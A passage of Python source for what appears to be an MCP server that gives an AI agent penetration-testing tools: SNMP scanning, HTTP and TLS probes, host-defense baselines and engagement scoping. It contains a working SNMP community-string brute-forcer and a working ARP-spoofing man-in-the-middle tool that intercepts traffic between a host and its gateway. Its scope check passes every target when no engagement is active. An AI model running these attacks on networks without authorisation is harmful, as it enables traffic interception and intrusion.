    and more. Can brute-force community strings.

    SNMP with default "public" community string is extremely common
    on routers, switches, printers, and IoT devices.

    Args:
        target: Target IP address
        community: SNMP community string (default: "public")
        brute_force: If True, try common community strings
        walk: If True, do a full SNMP walk (verbose output)
        timeout: Timeout per query in seconds
    """
    def _encode_len(n):
        return bytes([n]) if n < 0x80 else bytes([0x81, n]) if n < 0x100 else bytes([0x82, (n >> 8) & 0xff, n & 0xff])

    def _encode_int(v):
        d = b"\x00" if v == 0 else v.to_bytes((v.bit_length() + 8) // 8, "big", signed=True)
        return b"\x02" + _encode_len(len(d)) + d

    def _encode_str(v):
        d = v.encode() if isinstance(v, str) else v
        return b"\x04" + _encode_len(len(d)) + d

    def _encode_oid(oid_str):
        parts = [int(x) for x in oid_str.split(".") if x]
        if len(parts) < 2: parts = [1, 3] + parts
        enc = bytes([parts[0] * 40 + parts[1]])
        for p in parts[2:]:
            if p < 128: enc += bytes([p])
            else:
                t = []
                t.append(p & 0x7f); p >>= 7
                while p: t.append(0x80 | (p & 0x7f)); p >>= 7
                enc += bytes(reversed(t))
        return b"\x06" + _encode_len(len(enc)) + enc

    def _encode_seq(d): return b"\x30" + _encode_len(len(d)) + d

    def _build_get(comm, oid):
        vb = _encode_seq(_encode_oid(oid) + b"\x05\x00")
        vbl = _encode_seq(vb)
        pdu = _encode_int(1) + _encode_int(0) + _encode_int(0) + vbl
        pdu_enc = b"\xa0" + _encode_len(len(pdu)) + pdu
        msg = _encode_int(0) + _encode_str(comm) + pdu_enc
        return _encode_seq(msg)

    def _decode_response(data):
        try:
            if data[0] != 0x30: return None, None
            off = 2 if data[1] < 0x80 else (3 if data[1] == 0x81 else 4)
            content = data[off:]
            i = 0
            for _ in range(2):
                tl = 2 if content[i+1] < 0x80 else (3 if content[i+1] == 0x81 else 4)
                vlen = content[i+1] if content[i+1] < 0x80 else (content[i+2] if content[i+1] == 0x81 else (content[i+2] << 8 | content[i+3]))
                i += tl + vlen
            if content[i] != 0xa2: return None, None
            raw = content[i:]
            for j in range(len(raw) - 1):
                if raw[j] == 0x06:
                    oid_len = raw[j+1]
                    val_start = j + 2 + oid_len
                    if val_start < len(raw):
                        val_tag = raw[val_start]
                        val_len = raw[val_start + 1] if val_start + 1 < len(raw) else 0
                        val_data = raw[val_start + 2:val_start + 2 + val_len]
                        if val_tag == 0x04:
                            return "string", val_data.decode("utf-8", errors="replace")
                        elif val_tag == 0x02:
                            return "int", int.from_bytes(val_data, "big", signed=True)
                        elif val_tag == 0x43:
                            ticks = int.from_bytes(val_data, "big")
                            s = ticks // 100
                            return "time", f"{s//86400}d {(s%86400)//3600}h {(s%3600)//60}m"
                        elif val_tag == 0x40:
                            return "ip", ".".join(str(b) for b in val_data)
                        elif val_tag in (0x41, 0x42, 0x46):
                            return "int", int.from_bytes(val_data, "big")
                        elif val_tag in (0x80, 0x81, 0x82):
                            return None, None
            return None, None
        except Exception:
            return None, None

    def _snmp_get(comm, oid):
        pkt = _build_get(comm, oid)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            sock.sendto(pkt, (target, 161))
            data, _ = sock.recvfrom(65535)
            sock.close()
            _, val = _decode_response(data)
            return val
        except Exception:
            return None

    lines = [f"SNMP Scan: {target}", ""]

    if brute_force:
        communities = [
            "public", "private", "community", "snmp", "monitor",
            "manager", "admin", "default", "read", "write",
            "secret", "cisco", "internal", "test", "guest",
        ]
        lines.append("Brute-forcing community strings:")
        found = []
        for comm in communities:
            val = _snmp_get(comm, "1.3.6.1.2.1.1.1.0")
            if val is not None:
                found.append(comm)
                lines.append(f"  [+] '{comm}' — {str(val)[:80]}")
        if not found:
            lines.append("  No valid community strings found.")
        return "\n".join(lines)

    oids = {
        "1.3.6.1.2.1.1.1.0": "sysDescr",
        "1.3.6.1.2.1.1.2.0": "sysObjectID",
        "1.3.6.1.2.1.1.3.0": "sysUpTime",
        "1.3.6.1.2.1.1.4.0": "sysContact",
        "1.3.6.1.2.1.1.5.0": "sysName",
        "1.3.6.1.2.1.1.6.0": "sysLocation",
    }

    any_response = False
    for oid, name in oids.items():
        val = _snmp_get(community, oid)
        if val is not None:
            any_response = True
            lines.append(f"  {name:<15} {str(val)[:100]}")

    if not any_response:
        lines.append(f"No response with community '{community}'.")
        lines.append("Try --brute_force=true or a different community string.")

    result = "\n".join(lines)
    return _auto_save("snmp_scan", result,
                      {"target": target, "community": community, "brute_force": brute_force},
                      structured_data={"target": target, "community": community,
                                       "responded": any_response})


# ── Scan Result Persistence ──


from ursa_minor.defense import (
    collect_host_snapshot,
    collect_persistence_entries,
    diff_snapshots,
    load_baseline,
    render_diff_report,
    render_persistence_report,
    render_triage_report,
    save_baseline,
)
from ursa_minor.results import list_results, get_result, export_json, export_csv, export_html
from ursa_minor.results import export_engagement_report as _engagement_report
from ursa_minor.results import diff_results as _diff_results


@mcp_server.tool()
def detect_persistence(
    root_path: str | None = None,
    system: str | None = None,
) -> str:
    """
    Scan common persistence locations for suspicious autoruns and startup artifacts.

    Args:
        root_path: Optional filesystem root to inspect instead of the live host.
        system: Override platform detection ("linux", "darwin", or "windows").
    """
    entries = collect_persistence_entries(root_path=root_path, system=system)
    result = render_persistence_report(entries)
    return _auto_save(
        "detect_persistence",
        result,
        {"root_path": root_path or "/", "system": system or ""},
        structured_data=entries,
    )


@mcp_server.tool()
def create_baseline(
    name: str = "default",
    root_path: str | None = None,
    system: str | None = None,
) -> str:
    """
    Create and save a defensive host baseline for later drift comparison.

    Args:
        name: Baseline name (default "default").
        root_path: Optional filesystem root to inspect instead of the live host.
        system: Override platform detection ("linux", "darwin", or "windows").
    """
    snapshot = collect_host_snapshot(root_path=root_path, system=system)
    baseline_path = save_baseline(name, snapshot)
    lines = [
        f"Baseline saved: {name}",
        f"Path: {baseline_path}",
        f"Platform: {snapshot.get('platform', 'unknown')}",
        f"Persistence artifacts: {len(snapshot.get('persistence', []))}",
        f"Local users: {len(snapshot.get('users', []))}",
        f"Listening ports: {len(snapshot.get('listening_ports', []))}",
    ]
    result = "\n".join(lines)
    return _auto_save(
        "create_baseline",
        result,
        {"baseline_name": name, "root_path": root_path or "/", "system": system or ""},
        structured_data=snapshot,
    )


@mcp_server.tool()
def baseline_diff(
    name: str = "default",
    root_path: str | None = None,
    system: str | None = None,
) -> str:
    """
    Compare the current host state against a saved baseline.

    Args:
        name: Baseline name to compare against.
        root_path: Optional filesystem root to inspect instead of the live host.
        system: Override platform detection ("linux", "darwin", or "windows").
    """
    baseline = load_baseline(name)
    if not baseline:
        return f"Baseline '{name}' not found. Run create_baseline(name=\"{name}\") first."

    current = collect_host_snapshot(root_path=root_path, system=system)
    diff = diff_snapshots(baseline, current)
    result = render_diff_report(name, diff)
    return _auto_save(
        "baseline_diff",
        result,
        {"baseline_name": name, "root_path": root_path or "/", "system": system or ""},
        structured_data=diff,
    )


@mcp_server.tool()
def triage_host(
    baseline_name: str | None = None,
    root_path: str | None = None,
    system: str | None = None,
) -> str:
    """
    Run a lightweight host-defense triage workflow.

    Args:
        baseline_name: Optional saved baseline to compare against.
        root_path: Optional filesystem root to inspect instead of the live host.
        system: Override platform detection ("linux", "darwin", or "windows").
    """
    snapshot = collect_host_snapshot(root_path=root_path, system=system)
    baseline_diff_data = None

    if baseline_name:
        baseline = load_baseline(baseline_name)
        if baseline:
            baseline_diff_data = diff_snapshots(baseline, snapshot)

    result = render_triage_report(
        snapshot,
        snapshot.get("persistence", []),
        diff=baseline_diff_data,
        baseline_name=baseline_name if baseline_diff_data else None,
    )
    structured = {
        "snapshot": snapshot,
        "baseline_name": baseline_name,
        "baseline_diff": baseline_diff_data,
    }
    return _auto_save(
        "triage_host",
        result,
        {"baseline_name": baseline_name or "", "root_path": root_path or "/", "system": system or ""},
        structured_data=structured,
    )


@mcp_server.tool()
def list_scan_results(
    tool_filter: str | None = None,
    target_filter: str | None = None,
    limit: int = 50,
) -> str:
    """
    List saved scan results from previous tool runs.

    Args:
        tool_filter: Filter by tool name (e.g. "scan_ports", "full_recon").
        target_filter: Filter by target (substring match on metadata values).
        limit: Max results to return (default 50).
    """
    results = list_results(tool_filter=tool_filter, target_filter=target_filter, limit=limit)

    if not results:
        return "No saved scan results found."

    lines = [
        f"Saved Scan Results ({len(results)} found)",
        "",
        f"{'ID':<40} {'Tool':<20} {'Timestamp'}",
        "-" * 80,
    ]

    for r in results:
        meta = r.get("metadata", {})
        target = meta.get("target", meta.get("target_range", meta.get("url", meta.get("domain", ""))))
        line = f"{r['id']:<40} {r['tool']:<20} {r['timestamp']}"
        if target:
            line += f"  ({target})"
        lines.append(line)

    return "\n".join(lines)


@mcp_server.tool()
def get_scan_result(result_id: str) -> str:
    """
    Retrieve a specific saved scan result by ID.

    Args:
        result_id: The result ID (e.g. "scan_ports_20260306_143022").
    """
    record = get_result(result_id)
    if not record:
        return f"Result '{result_id}' not found."

    lines = [
        f"Scan Result: {result_id}",
        f"Tool: {record.get('tool', 'unknown')}",
        f"Time: {record.get('timestamp_str', 'unknown')}",
    ]

    metadata = record.get("metadata", {})
    if metadata:
        lines.append("Metadata:")
        for k, v in metadata.items():
            lines.append(f"  {k}: {v}")

    lines.append("")
    lines.append(record.get("result", ""))

    return "\n".join(lines)


@mcp_server.tool()
def export_scan_result(
    result_id: str,
    format: str = "json",
) -> str:
    """
    Export a saved scan result to a specific format.

    Args:
        result_id: The result ID to export.
        format: Export format — "json", "csv", or "html".
    """
    format = format.lower()

    if format == "json":
        return export_json(result_id)
    elif format == "csv":
        return export_csv(result_id)
    elif format == "html":
        return export_html(result_id)
    else:
        return f"Unknown format '{format}'. Use: json, csv, or html."


@mcp_server.tool()
def export_engagement_report(
    result_ids: str | None = None,
    tool_filter: str | None = None,
    title: str = "Engagement Report",
    format: str = "html",
) -> str:
    """
    Generate a combined report from multiple saved scan results.

    Args:
        result_ids: Comma-separated result IDs to include. If not provided,
                    uses all results (filtered by tool_filter).
        tool_filter: Only include results from this tool type.
        title: Report title.
        format: "html", "json", or "csv".
    """
    ids = [r.strip() for r in result_ids.split(",")] if result_ids else None
    return _engagement_report(result_ids=ids, tool_filter=tool_filter, title=title, format=format)


@mcp_server.tool()
def diff_scan_results(
    baseline_id: str,
    current_id: str,
) -> str:
    """
    Diff two saved scan results to surface regressions or fixed issues.

    Compares the structured findings of two scans saved under the given
    result IDs and reports:

    - NEW findings — present in current but absent from baseline (regressions
      or newly discovered issues after a change)
    - FIXED findings — present in baseline but absent from current (issues
      that disappeared — either genuinely fixed or environment-changed)
    - UNCHANGED count — findings common to both runs

    Both results must come from the same tool (e.g. two ``vuln_scan`` runs
    against the same target before and after a patch). Cross-tool diffs are
    accepted but may produce noisy output.

    Typical workflow::

        vuln_scan(url=...) → saves baseline_id
        # apply fix to target
        vuln_scan(url=...) → saves current_id
        diff_scan_results(baseline_id=..., current_id=...)

    Args:
        baseline_id: Result ID of the earlier (reference) scan.
        current_id:  Result ID of the newer scan to compare against.
    """
    diff = _diff_results(baseline_id, current_id)

    if diff.get("error"):
        return f"diff_scan_results error: {diff['error']}"

    lines = [
        f"Scan Diff: {baseline_id} → {current_id}",
        f"  Baseline : {diff['baseline_tool']} @ {diff['baseline_timestamp']}",
        f"  Current  : {diff['current_tool']} @ {diff['current_timestamp']}",
        "",
    ]

    new_f = diff["new_findings"]
    fixed_f = diff["fixed_findings"]
    unchanged = diff["unchanged_count"]

    if new_f:
        lines.append(f"NEW ({len(new_f)}) — present in current, absent from baseline:")
        for item in new_f:
            lines.append(f"  + {item}")
        lines.append("")

    if fixed_f:
        lines.append(f"FIXED ({len(fixed_f)}) — present in baseline, absent from current:")
        for item in fixed_f:
            lines.append(f"  - {item}")
        lines.append("")

    lines.append(f"UNCHANGED: {unchanged} finding(s) in common")

    if not new_f and not fixed_f:
        lines.append("\nNo differences detected — scans are identical.")

    result = "\n".join(lines)
    return _auto_save(
        "diff_scan_results",
        result,
        {
            "baseline_id": baseline_id,
            "current_id": current_id,
            "new_count": len(new_f),
            "fixed_count": len(fixed_f),
            "unchanged_count": unchanged,
        },
        structured_data=diff,
    )


# ── ARP Spoof (MCP-exposed with safeguards) ──


import ipaddress
import threading

_arp_spoof_state: dict[str, Any] = {
    "active": False,
    "stop_event": None,
    "thread": None,
    "packets_sent": 0,
}


def _is_private_ip(ip_str: str) -> bool:
    """Check if an IP is in a private RFC 1918 range."""
    try:
        addr = ipaddress.ip_address(ip_str)
        return addr.is_private
    except ValueError:
        return False


@mcp_server.tool()
def arp_spoof(
    target_ip: str,
    gateway_ip: str | None = None,
    interface: str | None = None,
    duration: int = 60,
    confirm: bool = False,
) -> str:
    """
    Perform ARP spoofing (MITM) between a target and gateway.

    IMPORTANT: This tool requires explicit confirmation. Set confirm=True
    to proceed. Only works on private (RFC 1918) networks.

    This enables IP forwarding, sends spoofed ARP replies to both target
    and gateway, and auto-restores ARP tables when stopped or when
    duration expires.

    Args:
        target_ip: Target IP address to intercept.
        gateway_ip: Gateway IP (auto-detected if not specified).
        interface: Network interface to use (auto-detected if not specified).
        duration: Spoofing duration in seconds (default 60, max 300).
        confirm: Must be True to proceed — safety check.
    """
    if not confirm:
        return (
            "ARP spoofing requires explicit confirmation.\n"
            "Call with confirm=True to proceed.\n"
            "This will intercept traffic between the target and gateway."
        )

    if _arp_spoof_state["active"]:
        return "ARP spoof is already running. Use arp_spoof_stop() first."

    if not _is_private_ip(target_ip):
        return f"Refused: {target_ip} is not a private (RFC 1918) IP address."

    # Cap duration
    try:
        from major.config import get_config
        max_duration = get_config().get("minor.arp_spoof_max_duration", 300)
    except ImportError:
        max_duration = 300
    duration = min(duration, max_duration)

    # Auto-detect gateway
    if not gateway_ip:
        try:
            import subprocess
            result = subprocess.run(
                ["route", "-n", "get", "default"],
                capture_output=True, text=True, timeout=5,
            )
            for line in result.stdout.splitlines():
                if "gateway" in line.lower():
                    gateway_ip = line.split(":")[-1].strip()
                    break
        except Exception:
            pass

    if not gateway_ip:
        return "Could not auto-detect gateway. Specify gateway_ip explicitly."

    if not _is_private_ip(gateway_ip):
        return f"Refused: gateway {gateway_ip} is not a private (RFC 1918) IP address."

    # Resolve MACs
    from scapy.all import getmacbyip, get_if_hwaddr, sendp  # type: ignore[attr-defined]

    target_mac = getmacbyip(target_ip)
    if not target_mac:
        return f"Could not resolve MAC for target {target_ip}. Is it online?"

    gateway_mac = getmacbyip(gateway_ip)
    if not gateway_mac:
        return f"Could not resolve MAC for gateway {gateway_ip}."

    my_mac = get_if_hwaddr(interface or conf.iface)

    # Enable IP forwarding
    import sys as _sys
    import subprocess
    if _sys.platform == "darwin":
        subprocess.run(["sysctl", "-w", "net.inet.ip.forwarding=1"], capture_output=True)
    elif _sys.platform == "linux":
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1")
        except PermissionError:
            return "Cannot enable IP forwarding. Run with sudo."

    stop_event = threading.Event()
    _arp_spoof_state["active"] = True
    _arp_spoof_state["stop_event"] = stop_event
    _arp_spoof_state["packets_sent"] = 0

    def _spoof_loop():
        try:
            while not stop_event.is_set():
                # Tell target: gateway is at our MAC
                pkt1 = Ether(dst=target_mac) / ARP(
                    op=2, pdst=target_ip, hwdst=target_mac,
                    psrc=gateway_ip, hwsrc=my_mac,
                )
                # Tell gateway: target is at our MAC
                pkt2 = Ether(dst=gateway_mac) / ARP(
                    op=2, pdst=gateway_ip, hwdst=gateway_mac,
                    psrc=target_ip, hwsrc=my_mac,
                )
                sendp(pkt1, verbose=False, iface=interface)
                sendp(pkt2, verbose=False, iface=interface)
                _arp_spoof_state["packets_sent"] += 2
                stop_event.wait(2)  # Re-send every 2 seconds
        finally:
            # Restore ARP tables
            for _ in range(5):
                sendp(Ether(dst=target_mac) / ARP(
                    op=2, pdst=target_ip, hwdst=target_mac,
                    psrc=gateway_ip, hwsrc=gateway_mac,
                ), verbose=False, iface=interface)
                sendp(Ether(dst=gateway_mac) / ARP(
                    op=2, pdst=gateway_ip, hwdst=gateway_mac,
                    psrc=target_ip, hwsrc=target_mac,
                ), verbose=False, iface=interface)

            # Disable IP forwarding
            if _sys.platform == "darwin":
                subprocess.run(["sysctl", "-w", "net.inet.ip.forwarding=0"], capture_output=True)
            elif _sys.platform == "linux":
                try:
                    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                        f.write("0")
                except Exception:
                    pass

            _arp_spoof_state["active"] = False
            _arp_spoof_state["thread"] = None

    # Auto-stop timer
    def _auto_stop():
        stop_event.wait(duration)
        if not stop_event.is_set():
            stop_event.set()

    thread = threading.Thread(target=_spoof_loop, daemon=True)
    timer = threading.Thread(target=_auto_stop, daemon=True)
    _arp_spoof_state["thread"] = thread
    thread.start()
    timer.start()

    return "\n".join([
        "ARP Spoof Started",
        f"  Target:   {target_ip} ({target_mac})",
        f"  Gateway:  {gateway_ip} ({gateway_mac})",
        f"  Your MAC: {my_mac}",
        f"  Duration: {duration}s (auto-stops)",
        f"  Interface: {interface or conf.iface}",
        "",
        "Traffic between target and gateway now flows through you.",
        "Use arp_spoof_stop() to stop early and restore ARP tables.",
    ])


@mcp_server.tool()
def arp_spoof_stop() -> str:
    """
    Stop an active ARP spoof and restore ARP tables.

    Cleanly stops the spoofing, sends correct ARP replies to
    restore the target and gateway caches, and disables IP forwarding.
    """
    if not _arp_spoof_state["active"]:
        return "No active ARP spoof to stop."

    stop_event = _arp_spoof_state.get("stop_event")
    if stop_event:
        stop_event.set()

    thread = _arp_spoof_state.get("thread")
    if thread:
        thread.join(timeout=10)

    packets = _arp_spoof_state["packets_sent"]
    _arp_spoof_state["packets_sent"] = 0

    return "\n".join([
        "ARP Spoof Stopped",
        f"  Total packets sent: {packets}",
        "  ARP tables restored",
        "  IP forwarding disabled",
    ])


# ── HTTP Probe ──


@mcp_server.tool()
def probe_http(
    url: str,
    timeout: float = 10.0,
    check_favicon: bool = True,
    check_methods: bool = True,
) -> str:
    """
    Perform a rich HTTP probe against a single URL and return a structured
    fingerprint. Useful as a first step before dirbust or vuln_scan.

    Collects in one round-trip:
    - Final status code and full redirect chain
    - Response time
    - Server and X-Powered-By headers
    - Content-Type, body size, sha256 body hash
    - Page title (extracted from HTML)
    - Security header audit (HSTS, CSP, X-Frame-Options, etc.)
    - TLS certificate: subject, issuer, expiry, protocol, cipher (HTTPS only)
    - Favicon sha256 hash (optional, makes Shodan-style fingerprinting easier)
    - Allowed HTTP methods via OPTIONS probe (optional)

    Args:
        url: Target URL (e.g., "https://target.com/api")
        timeout: Request timeout in seconds (default 10.0)
        check_favicon: Fetch /favicon.ico and hash it (default True)
        check_methods: Send OPTIONS to discover allowed methods (default True)
    """
    from ursa_minor.probe import probe as _probe, format_report as _fmt

    data = _probe(url, timeout=timeout,
                  check_favicon=check_favicon, check_methods=check_methods)
    report = _fmt(data)

    # Flatten security_headers for structured_data (keeps raw_headers out)
    structured = {k: v for k, v in data.items() if k != "raw_headers"}
    return _auto_save("probe_http", report,
                      {"url": url, "status": data.get("status")},
                      structured_data=structured)


# ── TLS Scan ──


@mcp_server.tool()
def tls_scan(
    host: str,
    port: int = 443,
    timeout: float = 10.0,
) -> str:
    """
    Analyze the TLS configuration of a host: certificate chain, protocol
    version, cipher suite, expiry, and SAN list. Uses Python ssl stdlib only
    (no external tools required).

    Flags:
    - Self-signed certificates
    - Certificates expiring within 30 days
    - Expired certificates
    - Weak protocols (TLSv1.0, TLSv1.1, SSLv3)
    - Hostname mismatch (CN vs target host)

    Args:
        host: Hostname or IP to test (e.g., "example.com" or "192.168.1.1")
        port: TLS port (default 443)
        timeout: Connection timeout in seconds (default 10.0)
    """
    import ssl
    import socket
    from datetime import datetime, timezone

    findings: list[str] = []
    structured: dict = {"host": host, "port": port}

    # Two-pass strategy: first try with system CA verification (CERT_REQUIRED)
    # so Python parses the full cert dict. If that fails (self-signed / unknown
    # CA), fall back to CERT_NONE to at least capture cipher and protocol.
    cert: dict = {}
    cipher_info: tuple | None = None
    version: str | None = None
    cert_verified: bool = False

    # Pass 1 — CA-verified context (populates getpeercert() dict)
    ctx_verify = ssl.create_default_context()
    ctx_verify.check_hostname = False  # hostname check done separately below
    try:
        with socket.create_connection((host, port), timeout=timeout) as raw:
            with ctx_verify.wrap_socket(raw, server_hostname=host) as tls:
                cert = tls.getpeercert() or {}
                cipher_info = tls.cipher()
                version = tls.version()
                cert_verified = True
    except ssl.SSLCertVerificationError:
        # Pass 2 — CERT_NONE fallback for self-signed / private CA certs
        ctx_none = ssl.create_default_context()
        ctx_none.check_hostname = False
        ctx_none.verify_mode = ssl.CERT_NONE
        try:
            with socket.create_connection((host, port), timeout=timeout) as raw:
                with ctx_none.wrap_socket(raw, server_hostname=host) as tls:
                    cert = {}  # empty — CERT_NONE doesn't populate the dict
                    cipher_info = tls.cipher()
                    version = tls.version()
                    cert_verified = False
            findings.append("[MEDIUM] Certificate not trusted by system CA store — self-signed or private CA [WSTG-CRYP-01][ASVS-9.2.1]")
        except Exception as exc:
            return _auto_save(
                "tls_scan",
                f"TLS Scan: {host}:{port}\n\nConnection failed: {exc}",
                {"host": host, "port": port, "error": str(exc)},
            )
    except Exception as exc:
        return _auto_save(
            "tls_scan",
            f"TLS Scan: {host}:{port}\n\nConnection failed: {exc}",
            {"host": host, "port": port, "error": str(exc)},
        )

    proto = version or "Unknown"
    cipher = cipher_info[0] if cipher_info else "Unknown"
    cipher_bits = cipher_info[2] if cipher_info and len(cipher_info) > 2 else None

    structured["protocol"] = proto
    structured["cipher"] = cipher
    structured["cipher_bits"] = cipher_bits

    if proto in ("SSLv3", "TLSv1", "TLSv1.1"):
        findings.append(f"[HIGH] Weak protocol in use: {proto} (minimum TLSv1.2 required) [WSTG-CRYP-01][ASVS-9.1.2]")
    elif proto == "TLSv1.2":
        findings.append(f"[INFO] Protocol: {proto} (TLSv1.3 preferred)")
    else:
        findings.append(f"[OK] Protocol: {proto}")

    if cipher_bits and cipher_bits < 128:
        findings.append(f"[HIGH] Weak cipher key size: {cipher_bits} bits [WSTG-CRYP-01][ASVS-9.1.3]")

    subject_dict: dict = {}
    issuer_dict: dict = {}
    san: list[str] = []
    not_after_str = ""
    days_remaining: int | None = None

    if cert:
        subject_dict = dict(x[0] for x in cert.get("subject", []))  # type: ignore[misc]
        issuer_dict = dict(x[0] for x in cert.get("issuer", []))  # type: ignore[misc]
        san = [str(pair[1]) for pair in cert.get("subjectAltName", []) if pair[0] == "DNS"]
        not_after_str = str(cert.get("notAfter", ""))

        if not_after_str:
            try:
                expiry = datetime.strptime(not_after_str, "%b %d %H:%M:%S %Y %Z")
                expiry = expiry.replace(tzinfo=timezone.utc)
                now = datetime.now(tz=timezone.utc)
                days_remaining = (expiry - now).days
                if days_remaining < 0:
                    findings.append(f"[CRITICAL] Certificate EXPIRED {abs(days_remaining)} days ago [WSTG-CRYP-01][ASVS-9.2.1]")
                elif days_remaining < 14:
                    findings.append(f"[HIGH] Certificate expires in {days_remaining} days [WSTG-CRYP-01][ASVS-9.2.1]")
                elif days_remaining < 30:
                    findings.append(f"[MEDIUM] Certificate expires in {days_remaining} days [WSTG-CRYP-01][ASVS-9.2.1]")
                else:
                    findings.append(f"[OK] Certificate valid for {days_remaining} more days")
            except ValueError:
                pass

        # Self-signed check
        if subject_dict == issuer_dict:
            findings.append(f"[HIGH] Self-signed certificate [WSTG-CRYP-01][ASVS-9.2.1]")
            structured["self_signed"] = True
        else:
            structured["self_signed"] = False

        # Hostname match
        cn = subject_dict.get("commonName", "")
        host_lower = host.lower()
        in_san = any(
            host_lower == s.lower() or
            (s.startswith("*.") and host_lower.endswith(s[1:].lower()))
            for s in san
        )
        in_cn = (
            host_lower == cn.lower() or
            (cn.startswith("*.") and host_lower.endswith(cn[1:].lower()))
        )
        if not in_san and not in_cn:
            findings.append(
                f"[MEDIUM] Hostname mismatch — '{host}' not in CN '{cn}' or SANs {san[:5]} [WSTG-CRYP-01][ASVS-9.2.1]"
            )

        structured.update({
            "subject_cn": cn,
            "issuer_cn": issuer_dict.get("commonName", ""),
            "issuer_org": issuer_dict.get("organizationName", ""),
            "not_after": not_after_str,
            "days_remaining": days_remaining,
            "san": san[:20],
        })

    structured["findings"] = findings

    lines = [
        f"TLS Scan: {host}:{port}",
        f"  Protocol : {proto}",
        f"  Cipher   : {cipher}" + (f" ({cipher_bits}-bit)" if cipher_bits else ""),
        f"  Subject  : {subject_dict.get('commonName', '(none)')}",
        f"  Issuer   : {issuer_dict.get('commonName', '(none)')} / {issuer_dict.get('organizationName', '')}",
        f"  Expires  : {not_after_str or '(unknown)'}" +
            (f" ({days_remaining} days)" if days_remaining is not None else ""),
        "",
    ]
    if san:
        lines.append(f"  SANs ({len(san)}): {', '.join(san[:8])}" +
                     ("..." if len(san) > 8 else ""))
        lines.append("")
    lines.append("Findings:")
    for f in findings:
        lines.append(f"  {f}")
    if not findings:
        lines.append("  No issues detected.")

    result = "\n".join(lines)
    return _auto_save("tls_scan", result,
                      {"host": host, "port": port, "protocol": proto,
                       "findings": len([f for f in findings if not f.startswith("[OK") and not f.startswith("[INFO")])},
                      structured_data=structured)


# ── Engagement / Scope ──


@mcp_server.tool()
def create_engagement(
    name: str,
    scope_hosts: str,
    scope_paths: str = "/",
    allow_destructive: bool = False,
    rate_limit_rps: int = 10,
    notes: str = "",
) -> str:
    """
    Create a new pentest engagement and set it as active. The engagement
    records which hosts/CIDRs are in scope, which URL paths are allowed,
    whether destructive tests (SQLi, CMDi, LFI) are approved, and a
    suggested rate limit. Only one engagement is active at a time.

    Args:
        name: Human-readable engagement name (e.g., "Tardigrade local May 2026")
        scope_hosts: Comma-separated in-scope targets. Accepts:
                     - IP addresses: "127.0.0.1"
                     - CIDR ranges: "192.168.1.0/24"
                     - Hostnames: "example.com"
                     - Wildcard domains: "*.example.com"
        scope_paths: Comma-separated URL path prefixes in scope (default "/")
        allow_destructive: Set True to approve injection/exploit tests
                           (SQLi, CMDi, LFI). Defaults to False.
        rate_limit_rps: Suggested max requests per second (default 10)
        notes: Free-form operator notes
    """
    from ursa_minor.engagement import create as _create

    record = _create(
        name=name,
        scope_hosts=scope_hosts,
        scope_paths=scope_paths,
        allow_destructive=allow_destructive,
        rate_limit_rps=rate_limit_rps,
        notes=notes,
    )

    lines = [
        f"Engagement created: {record['name']}",
        f"  ID               : {record['id']}",
        f"  Scope hosts      : {', '.join(record['scope']['hosts'])}",
        f"  Scope paths      : {', '.join(record['scope']['paths'])}",
        f"  Allow destructive: {record['allow_destructive']}",
        f"  Rate limit       : {record['rate_limit_rps']} req/s",
    ]
    if notes:
        lines.append(f"  Notes            : {notes}")
    lines.append("")
    lines.append("This engagement is now active. Use check_scope(url) to validate targets before scanning.")

    return "\n".join(lines)


@mcp_server.tool()
def check_scope(url: str) -> str:
    """
    Check whether a URL is in scope for the currently active engagement.
    Returns scope status, the engagement ID, and whether destructive tests
    are approved. If no engagement is active, all URLs are considered in scope.

    Args:
        url: URL to check (e.g., "http://127.0.0.1:18069/admin")
    """
    from ursa_minor.engagement import check as _check

    result = _check(url)

    status = "IN SCOPE" if result["in_scope"] else "OUT OF SCOPE"
    lines = [
        f"Scope check: {url}",
        f"  Status           : {status}",
        f"  Reason           : {result['reason']}",
        f"  Engagement       : {result['engagement_id'] or 'none (no active engagement)'}",
        f"  Destructive tests: {'approved' if result['allow_destructive'] else 'not approved'}",
    ]
    return "\n".join(lines)


@mcp_server.tool()
def get_engagement() -> str:
    """
    Show details of the currently active engagement, or report that no
    engagement is active.
    """
    from ursa_minor.engagement import get_active as _get, list_all as _list

    record = _get()
    if record is None:
        recent = _list(limit=5)
        lines = ["No active engagement."]
        if recent:
            lines.append("")
            lines.append("Recent engagements:")
            for r in recent:
                lines.append(f"  [{r['status']}] {r['id']} — {r['name']}")
        return "\n".join(lines)

    lines = [
        f"Active engagement: {record['name']}",
        f"  ID               : {record['id']}",
        f"  Created          : {record['created_at']}",
        f"  Status           : {record['status']}",
        f"  Scope hosts      : {', '.join(record['scope']['hosts'])}",
        f"  Scope paths      : {', '.join(record['scope']['paths'])}",
        f"  Allow destructive: {record['allow_destructive']}",
        f"  Rate limit       : {record['rate_limit_rps']} req/s",
    ]
    if record.get("notes"):
        lines.append(f"  Notes            : {record['notes']}")
    return "\n".join(lines)


@mcp_server.tool()
def close_engagement() -> str:
    """
    Close the active engagement and mark it as complete. Any future
    check_scope calls will return in-scope (no active engagement = no guard).
    """
    from ursa_minor.engagement import close as _close

    record = _close()
    if record is None:
        return "No active engagement to close."
    return "\n".join([
        f"Engagement closed: {record['name']}",
        f"  ID        : {record['id']}",
        f"  Closed at : {record['closed_at']}",
    ])


@mcp_server.tool()
def ursa_asset_graph(fact_type: str = "", limit: int = 30) -> str:
    """
    Show the normalized asset graph for the active engagement (Phase 6A).

    Scans run through Ursa Minor automatically populate a graph of typed,
    de-duplicated facts (host, domain, service, certificate, route, endpoint,
    parameter, auth_context, technology_fingerprint, finding) instead of leaving
    insight buried in per-tool text output. This reports the current world model
    so you can reason over facts, not terminal spam.

    Args:
        fact_type: Optional — list facts of one type (e.g. "host", "service",
                   "finding"). Empty shows the summary counts across all types.
        limit: Max facts to list when a fact_type is given.
    """
    from ursa_minor.assetgraph import load_graph, FACT_TYPES

    graph = load_graph()
    summary = graph.summary()

    if not fact_type:
        lines = [
            f"Asset graph for engagement '{summary['engagement_id']}': "
            f"{summary['total_facts']} facts, {summary['edges']} edges.",
            "",
        ]
        for ftype in FACT_TYPES:
            count = summary["counts"].get(ftype, 0)
            if count:
                lines.append(f"  {ftype:<24} {count}")
        if summary["total_facts"] == 0:
            lines.append("  (empty — run a scan to populate it)")
        return "\n".join(lines)

    fact_type = fact_type.strip().lower()
    if fact_type not in FACT_TYPES:
